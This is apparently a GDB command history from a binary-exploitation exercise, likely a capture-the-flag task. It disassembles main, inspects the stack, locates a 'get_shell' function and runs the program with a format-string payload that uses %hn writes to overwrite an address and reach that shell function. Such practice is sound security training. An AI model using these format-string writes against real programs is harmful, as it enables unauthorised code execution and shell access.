b *main
r
disass main
b *main+22
c
ni
disass main
b *main
r
disass main
b *main+34
c
x/10gx $esp
x/10wxx $esp
r
c
x/10wxx $esp
x/10wx $esp
x/wx $esp
print get_shell
info func
print get_shell
r
python gdb.excute("run <<< 'b'&\xa0\x04\x08$\xa0\x04\x08%2044c%1$hn%32261c%2$hn'")
python gdb.excute("run <<< '&\xa0\x04\x08$\xa0\x04\x08%2044c%1$hn%32261c%2$hn'")
python gdb.execute("run <<< '&\xa0\x04\x08$\xa0\x04\x08%2044c%1$hn%32261c%2$hn'")
c
x/10wx $esp
x/20wx $esp
x/30wx $esp
quit
b *main
r
disass main
ni
ni
ni
vmmap
stack
disass main
